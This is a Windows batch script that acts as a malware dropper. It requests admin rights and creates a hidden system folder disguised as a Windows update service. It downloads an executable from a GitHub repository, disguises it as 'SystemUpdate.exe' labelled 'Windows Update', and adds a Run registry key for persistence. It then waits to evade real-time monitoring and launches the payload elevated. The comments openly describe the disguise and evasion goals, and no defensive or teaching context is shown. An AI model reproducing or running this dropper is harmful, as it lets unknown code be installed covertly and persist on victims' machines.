@echo off
:: Check if already running
tasklist /FI "IMAGENAME eq SystemUpdate.exe" 2>NUL | find /I "SystemUpdate.exe" >NUL
if not errorlevel 1 exit

:: Request admin permissions if not already elevated
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting admin privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
    exit
)

:: Set legitimate folder path
set "folderPath=%USERPROFILE%\AppData\Local\Microsoft\Windows\UpdateService"
mkdir "%folderPath%"

:: Make folder and file hidden and system files
attrib +H +S "%folderPath%" /S /D

:: Download executable from GitHub
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe' -OutFile '%folderPath%\SystemUpdate.exe'"

:: Spoof file properties to look like a legitimate Windows process
powershell -Command "(Get-Item '%folderPath%\SystemUpdate.exe').VersionInfo | Set-ItemProperty -Name 'ProductName' -Value 'Windows Update'"

:: Add to startup for persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /t REG_SZ /d "%folderPath%\SystemUpdate.exe" /f

:: Delay execution to avoid detection by real-time monitoring
timeout /t 30 /nobreak >nul

:: Run the downloaded executable with elevated privileges
powershell -Command "Start-Process '%folderPath%\SystemUpdate.exe' -Verb runAs"

:: Clear command history to remove traces
doskey /history >nul

:: Exit the script
exit
